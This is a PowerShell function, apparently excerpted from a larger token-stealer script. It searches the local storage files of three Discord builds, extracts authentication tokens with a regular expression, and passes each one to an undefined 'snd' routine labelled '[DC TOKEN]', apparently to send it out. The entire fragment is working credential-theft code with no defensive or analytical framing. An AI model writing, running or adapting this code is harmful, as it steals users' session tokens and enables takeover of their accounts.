function gtDiscord {
    $p=@("$env:LOCALAPPDATA\Discord\Local Storage\leveldb","$env:LOCALAPPDATA\discordcanary\Local Storage\leveldb","$env:LOCALAPPDATA\discordptb\Local Storage\leveldb")
    foreach($q in $p){
        if(Test-Path $q){
            Get-ChildItem "$q\*.ldb" -ErrorAction SilentlyContinue|%{
                $c=Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                [regex]::Matches($c,'[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}')|%{snd "**[DC TOKEN]**`n```$($_.Value)```";Start-Sleep -Milliseconds 300}
            }
        }
    }
}

